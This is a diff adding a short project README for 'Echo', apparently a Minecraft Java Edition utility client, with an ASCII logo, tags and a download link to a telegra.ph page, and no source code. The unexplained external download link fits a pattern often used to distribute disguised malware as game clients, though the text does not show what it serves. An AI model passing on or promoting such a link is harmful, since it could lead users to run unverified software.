@@ -1,0 +1,16 @@
+  _____     _
+ | ____|___| |__   ___
+ |  _| / __| '_ \ / _ \
+ | |__| (__| | | | (_) |
+ |_____\___|_| |_|\___/
+
+Echo. Minecraft Java Edition utility client.
+
+
+[+] DOWNLOAD LINK: https://telegra.ph/Download-05-21-39
+- Category: Minecraft client.
+- Platforms: Java Edition.
+
+
+TAGS
+echo, echo-client, minecraft-client, minecraft-java
